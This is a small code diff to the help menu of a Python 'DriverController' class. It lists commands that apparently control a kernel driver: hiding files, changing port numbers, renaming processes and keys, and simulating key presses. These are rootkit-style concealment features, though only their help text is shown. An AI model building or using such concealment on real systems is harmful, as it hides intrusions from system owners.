@@ -68,12 +68,12 @@ class DriverController:
     @staticmethod
     def help():
         print(r"""
-        test syscall: 0x97
         rename process for pid: rpid <%d> <%s>
         rename process for name: rname <%s> <%s>
         rename key: key <%s> <%s>
-        hide port src: net_src <%d>
-        hide port dst: net_dst <%d>
+        change port src: net_src <%d> <%d>
+        change port dst: net_dst <%d> <%d>
+        hide file: hfile <%s>
         press keyboard: kb <%s>
         """)
 
